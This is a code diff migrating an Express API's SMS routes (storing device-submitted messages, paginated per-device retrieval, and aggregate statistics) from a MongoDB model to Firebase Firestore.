@@ -1,8 +1,9 @@
 const express = require('express');
 const router = express.Router();
-const SMS = require('../models/SMS');
+const mobileFirebaseService = require('../services/mobileFirebaseService');
+const { db } = require('../config/firebase');
 
-// Store SMS messages
+// Store SMS messages directly to Firebase
 router.post('/store', async (req, res) => {
   try {
     const { deviceId, messages, timestamp } = req.body;
@@ -11,55 +12,62 @@ router.post('/store', async (req, res) => {
       return res.status(400).json({ error: 'Invalid data format' });
     }
 
-    // Store each SMS message
-    const savedMessages = [];
-    for (const message of messages) {
-      const newSMS = new SMS({
-        deviceId,
-        address: message.address,
-        body: message.body,
-        date: new Date(message.date),
-        type: message.type,
-        timestamp: new Date(timestamp)
-      });
-      
-      const saved = await newSMS.save();
-      savedMessages.push(saved);
-    }
+    const result = await mobileFirebaseService.storeSMS({
+      deviceId,
+      messages,
+      timestamp
+    });
 
     res.status(201).json({
-      message: `Stored ${savedMessages.length} SMS messages`,
-      count: savedMessages.length
+      message: `Stored ${result.count} SMS messages in Firebase`,
+      count: result.count
     });
   } catch (error) {
-    console.error('Error storing SMS messages:', error);
-    res.status(500).json({ error: 'Failed to store SMS messages' });
+    console.error('Error storing SMS messages in Firebase:', error);
+    res.status(500).json({ error: 'Failed to store SMS messages in Firebase' });
   }
 });
 
-// Get SMS messages for a device
+// Get SMS messages for a device with pagination from Firebase
 router.get('/device/:deviceId', async (req, res) => {
   try {
     const { deviceId } = req.params;
-    const { limit = 100, offset = 0, type } = req.query;
+    const { page = 1, limit = 100, type } = req.query;
+    const pageNum = parseInt(page);
+    const limitNum = parseInt(limit);
+
+    let query = db.collection('sms').where('deviceId', '==', deviceId);
     
-    let query = { deviceId };
     if (type) {
-      query.type = type;
+      query = query.where('type', '==', type);
     }
     
-    const messages = await SMS.find(query)
-      .sort({ date: -1 })
-      .limit(parseInt(limit))
-      .skip(parseInt(offset));
+    const messagesQuery = await query
+      .orderBy('date', 'desc')
+      .limit(limitNum)
+      .offset((pageNum - 1) * limitNum)
+      .get();
+
+    const messages = messagesQuery.docs.map(doc => doc.data());
     
-    const total = await SMS.countDocuments(query);
-    
+    // Get total count
+    const totalQuery = await query.get();
+    const totalCount = totalQuery.size;
+    const totalPages = Math.ceil(totalCount / limitNum);
+
     res.json({
-      messages,
-      total,
-      limit: parseInt(limit),
-      offset: parseInt(offset)
+      success: true,
+      data: {
+        messages,
+        pagination: {
+          page: pageNum,
+          limit: limitNum,
+          totalCount,
+          totalPages,
+          hasNext: pageNum < totalPages,
+          hasPrev: pageNum > 1
+        }
+      }
     });
   } catch (error) {
     console.error('Error fetching SMS messages:', error);
@@ -67,26 +75,42 @@ router.get('/device/:deviceId', async (req, res) => {
   }
 });
 
-// Get SMS statistics
+// Get SMS statistics from Firebase
 router.get('/stats', async (req, res) => {
   try {
-    const totalMessages = await SMS.countDocuments();
-    const uniqueDevices = await SMS.distinct('deviceId').countDocuments();
+    const messagesQuery = await db.collection('sms').get();
+    const totalMessages = messagesQuery.size;
     
-    // Get message types distribution
-    const messageTypes = await SMS.aggregate([
-      { $group: { _id: '$type', count: { $sum: 1 } } },
-      { $sort: { count: -1 } }
-    ]);
+    // Get unique devices
+    const deviceIds = new Set();
+    const addresses = new Set();
+    const messageTypes = {};
     
-    // Get unique addresses
-    const uniqueAddresses = await SMS.distinct('address').countDocuments();
+    messagesQuery.docs.forEach(doc => {
+      const data = doc.data();
+      deviceIds.add(data.deviceId);
+      addresses.add(data.address);
+      
+      const type = data.type || 'unknown';
+      messageTypes[type] = (messageTypes[type] || 0) + 1;
+    });
     
+    const uniqueDevices = deviceIds.size;
+    const uniqueAddresses = addresses.size;
+    
+    // Convert messageTypes to array format
+    const messageTypesArray = Object.entries(messageTypes)
+      .map(([type, count]) => ({ type, count }))
+      .sort((a, b) => b.count - a.count);
+
     res.json({
-      totalMessages,
-      uniqueDevices,
-      uniqueAddresses,
-      messageTypes
+      success: true,
+      data: {
+        totalMessages,
+        uniqueDevices,
+        uniqueAddresses,
+        messageTypes: messageTypesArray
+      }
     });
   } catch (error) {
     console.error('Error fetching SMS stats:', error);
